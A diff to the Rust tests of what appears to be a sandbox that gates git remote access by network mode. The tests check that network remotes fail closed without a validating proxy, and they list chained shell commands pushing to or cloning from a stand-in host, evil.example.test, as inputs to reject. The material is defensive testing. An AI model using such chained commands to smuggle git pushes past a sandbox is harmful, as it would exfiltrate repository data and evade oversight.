@@ -1052,12 +1052,16 @@ mod tests {
 
     #[test]
     fn network_remotes_require_the_validating_proxy_and_fail_closed_elsewhere() {
+        let network_only =
+            GitGrantConfig::from_spec("upstream=https://git.example.test/org/repo.git")
+                .unwrap()
+                .unwrap();
         for mode in [SandboxNetworkMode::None, SandboxNetworkMode::Tunnel] {
-            let error = authorize_grant(&spec(), &[], Path::new("/tmp"), mode).unwrap_err();
+            let error = authorize_grant(&network_only, &[], Path::new("/tmp"), mode).unwrap_err();
             assert!(error.to_string().contains("git-remotes"), "{error}");
         }
         for mode in [SandboxNetworkMode::ProxyEnforced, SandboxNetworkMode::Proxy] {
-            assert!(authorize_grant(&spec(), &[], Path::new("/tmp"), mode).is_ok());
+            assert!(authorize_grant(&network_only, &[], Path::new("/tmp"), mode).is_ok());
         }
         let (temp, _) = workspace_with_remote();
         let cwd = temp.path().canonicalize().unwrap();
@@ -1275,8 +1279,8 @@ mod tests {
         )
         .unwrap();
         for command in [
-            "true && git push origin main",
-            "true; git push origin main",
+            "true && git push https://evil.example.test/repo.git main",
+            "true; git push https://evil.example.test/repo.git main",
             "true | git clone https://evil.example.test/repo.git",
             "bash -lc \"git clone https://evil.example.test/repo.git\"",
             "bash -c 'git fetch upstream'",
